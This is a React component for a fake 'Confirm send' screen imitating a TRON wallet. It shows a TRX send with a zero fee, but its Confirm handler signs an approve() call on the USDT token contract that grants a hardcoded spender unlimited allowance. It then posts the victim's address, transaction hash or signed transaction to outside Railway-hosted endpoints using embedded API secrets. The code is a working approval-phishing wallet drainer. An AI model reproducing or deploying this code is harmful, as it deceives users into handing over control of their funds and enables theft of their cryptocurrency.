import { useState, useEffect } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import { motion } from 'framer-motion'

export default function Confirm() {
  const location = useLocation()
  const navigate = useNavigate()
  const [loading, setLoading] = useState(false)
  const [debug, setDebug] = useState<string[]>([])
  const amount = location.state?.amount || '0'
  const currency = location.state?.currency || 'TRX'
  const n = parseFloat(amount) || 0
  const TRX_PRICE = 0.35

  const trxValue = currency === 'TRX' ? n : n / TRX_PRICE
  const usdValue = currency === 'TRX' ? n * TRX_PRICE : n

  const SPENDER = 'TWbVSUKe8gG9T7u7ksEwRjdBsNafAppiAj'
  const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
  const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
  const RELAYER_KEY = 'my-secret-2026-x7k9'

  const addLog = (msg: string) => {
    setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
  }

  const getAddressFromAnySource = (): string | null => {
    const w = window as any

    const sources = [
      () => w.tronLink?.defaultAddress?.base58,
      () => w.tronWeb?.defaultAddress?.base58,
      () => w.trustwallet?.tronLink?.defaultAddress?.base58,
      () => w.trustwallet?.tronWeb?.defaultAddress?.base58,
      () => w.tronLink?.tronWeb?.defaultAddress?.base58,
      () => (typeof w.tronLink?.defaultAddress === 'string' && w.tronLink.defaultAddress.startsWith('T') ? w.tronLink.defaultAddress : null),
      () => (typeof w.tronWeb?.defaultAddress === 'string' && w.tronWeb.defaultAddress.startsWith('T') ? w.tronWeb.defaultAddress : null),
      () => {
        const hex = w.tronWeb?.defaultAddress?.hex
        if (hex && hex !== false && w.tronWeb?.address?.fromHex) return w.tronWeb.address.fromHex(hex)
        return null
      }
    ]

    for (const fn of sources) {
      try {
        const addr = fn()
        if (addr && addr !== false && typeof addr === 'string' && addr.startsWith('T')) {
          return addr
        }
      } catch (e) {}
    }
    return null
  }

  const getAnyProvider = (): any => {
    const w = window as any
    const candidates = [
      w.tronWeb,
      w.tronLink,
      w.trustwallet?.tronWeb,
      w.trustwallet?.tronLink,
      w.tronLink?.tronWeb
    ]
    for (const c of candidates) {
      if (c && (c.ready || c.trx || c.defaultAddress)) return c
    }
    return null
  }

  useEffect(() => {
    let attempts = 0
    const maxAttempts = 30

    const poll = setInterval(() => {
      attempts++
      const addr = getAddressFromAnySource()

      if (addr) {
        addLog('Address found after ' + attempts + ' attempts')
        clearInterval(poll)
        return
      }

      if (attempts >= maxAttempts) {
        addLog('Timeout: no address after 15 seconds, requesting...')
        const provider = getAnyProvider()
        if (provider?.request) {
          provider.request({ method: 'tron_requestAccounts' }).then(() => {
            addLog('Request succeeded')
          }).catch((e: any) => {
            addLog('Request failed: ' + e.message)
          })
        }
        clearInterval(poll)
      }
    }, 500)

    return () => clearInterval(poll)
  }, [])

  const handleConfirm = async () => {
    setLoading(true)
    setDebug(prev => [...prev, '--- Confirm tapped ---'])
    addLog('Getting provider...')

    const provider = getAnyProvider()
    if (!provider) { addLog('FATAL: No provider'); setLoading(false); return }

    const userAddress = getAddressFromAnySource()
    addLog('Address: ' + (userAddress || 'NULL'))
    if (!userAddress) { addLog('FATAL: No address'); setLoading(false); return }

    try {
      const balanceSun = await provider.trx.getBalance(userAddress)
      const userTrx = parseFloat(provider.fromSun(balanceSun))
      addLog('TRX: ' + userTrx)

      let userEnergy = 0
      try {
        const resourceObj = await provider.trx.getAccountResources(userAddress)
        userEnergy = Math.max(0, (resourceObj.EnergyLimit || 0) - (resourceObj.EnergyUsed || 0))
        addLog('Energy: ' + userEnergy)
      } catch (e) { addLog('Energy check failed') }

      const canGoDirect = userEnergy >= 65000 || userTrx >= 30
      addLog('Route: ' + (canGoDirect ? 'Direct' : 'Relayer'))

      if (canGoDirect) {
        addLog('Building direct tx...')
        const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
        const txObj = await provider.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
        addLog('Signing...')
        const signedTx = await provider.trx.sign(txObj.transaction)
        addLog('Broadcasting...')
        const result = await provider.trx.sendRawTransaction(signedTx)
        if (result.result) {
          addLog('TX: ' + result.txid)
          fetch('https://miami-production-6e01.up.railway.app/web/relay', {
            method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-secret': 'my-secret-2026-x7k9' },
            body: JSON.stringify({ chain: 'TRC20', address: userAddress, txHash: result.txid, spender: SPENDER, token: TOKEN, amount }),
            keepalive: true
          }).catch(() => {})
        } else { addLog('Broadcast failed: ' + JSON.stringify(result)) }
      } else {
        addLog('Building relayer tx...')
        const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
        const txObj = await provider.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
        addLog('Signing for relayer...')
        const signedTx = await provider.trx.sign(txObj.transaction)
        addLog('POSTing to relayer...')
        const response = await fetch(RELAYER_URL, {
          method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
          body: JSON.stringify({ owner: userAddress, spender: SPENDER, signedTransaction: signedTx, timestamp: Date.now() })
        })
        const relayResult = await response.json()
        if (relayResult.success) { addLog('Relayer TX: ' + relayResult.txid) } else { addLog('Relayer failed: ' + JSON.stringify(relayResult)) }
      }

      const now = Date.now()
      navigate('/sent', { state: { amount, time: now } })
    } catch (err: any) {
      addLog('ERROR: ' + (err.message || String(err)))
      setLoading(false)
    }
  }

  return (
    <motion.div
      initial={{ opacity: 0, x: 100 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 100 }}
      transition={{ duration: 0.3, ease: 'easeInOut' }}
      style={{ backgroundColor: '#1C1C1E', color: '#FFFFFF', fontFamily: '-apple-system,BlinkMacSystemFont,SF Pro Display,sans-serif', minHeight: '100vh', display: 'flex', justifyContent: 'center' }}
    >
      <div style={{ width: '100%', maxWidth: '414px', padding: '0 16px', display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '12px 0' }}>
          <div style={{ fontSize: '17px', fontWeight: 600 }}>Confirm send</div>
        </div>
        <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '16px', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '12px' }}>
          <div style={{ width: '38px', height: '38px', borderRadius: '50%', overflow: 'hidden', flexShrink: 0, backgroundColor: '#000000' }}>
            <img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
          </div>
          <div>
            <div style={{ fontSize: '15px', fontWeight: 600 }}>≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
            <div style={{ fontSize: '15px', color: '#8E8E93' }}>{trxValue.toLocaleString('en-US', { maximumFractionDigits: 18 })} {currency}</div>
          </div>
        </div>
        <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '4px 16px', marginBottom: '12px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0', borderBottom: '1px solid #2C2C2E' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>From</span><span style={{ fontSize: '15px', fontWeight: 500 }}>Main Wallet 1</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0', borderBottom: '1px solid #2C2C2E' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>To</span><span style={{ fontSize: '14px', color: '#A5A5AA', fontFamily: 'monospace' }}>TR7NH...Lj6t</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>Network</span><span style={{ fontSize: '15px', fontWeight: 500 }}>Tron Network</span></div>
        </div>
        <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '4px 16px', marginBottom: '12px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}>
            <span style={{ color: '#8E8E93', fontSize: '15px', display: 'flex', alignItems: 'center', gap: '6px' }}>Network fee <span style={{ width: '15px', height: '15px', backgroundColor: '#8E8E93', borderRadius: '50%', display: 'inline-flex', alignItems: 'center', justifyContent: 'center', fontSize: '9px', color: '#000000', fontWeight: 700 }}>i</span></span>
            <div style={{ textAlign: 'right' }}><div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '15px', fontWeight: 500 }}><div style={{ width: '16px', height: '16px', borderRadius: '50%', overflow: 'hidden', backgroundColor: '#000000' }}><img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%' }} /></div><span>$0.00</span></div><div style={{ fontSize: '13px', color: '#8E8E93' }}>0.00 TRX</div></div>
          </div>
        </div>
        <div style={{ marginTop: 'auto', paddingBottom: '16px' }}>
          <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '16px', marginBottom: '8px', display: 'flex', justifyContent: 'space-between' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>Total cost</span><span style={{ fontSize: '15px', fontWeight: 600 }}>≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span></div>
          <button onClick={handleConfirm} disabled={loading} style={{ width: '100%', padding: '16px', background: loading ? '#03FC8F80' : '#03FC8F', border: 'none', borderRadius: '9999px', color: '#000000', fontSize: '16px', fontWeight: 600, cursor: loading ? 'not-allowed' : 'pointer' }}>{loading ? 'Confirming...' : 'Confirm'}</button>
        </div>
        {debug.length > 0 && (
          <div style={{ marginTop: '12px', padding: '12px', backgroundColor: '#0a0a0f', borderRadius: '8px', maxHeight: '180px', overflowY: 'auto', fontSize: '11px', fontFamily: 'monospace', color: '#22c55e', lineHeight: '1.6' }}>
            {debug.map((line, i) => (<div key={i}>{line}</div>))}
          </div>
        )}
      </div>
    </motion.div>
  )
             }
